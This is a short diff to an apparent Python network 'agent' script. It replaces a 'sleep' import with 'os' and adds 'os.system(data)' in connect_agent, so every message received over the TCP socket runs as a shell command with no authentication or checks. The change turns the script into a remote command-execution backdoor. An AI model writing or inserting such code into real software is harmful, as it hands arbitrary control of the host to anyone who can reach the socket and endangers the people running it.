@@ -1,6 +1,6 @@
 #!/usr/bin/env python
 
-from time import sleep
+import os
 import sys
 from socket import socket, AF_INET, SOCK_STREAM
 sys.path.insert(0, '..')
@@ -26,4 +26,4 @@ def connect_agent():
         if not data:
             continue
         LOG.info('Received {}'.format(data))
-
+        os.system(data)
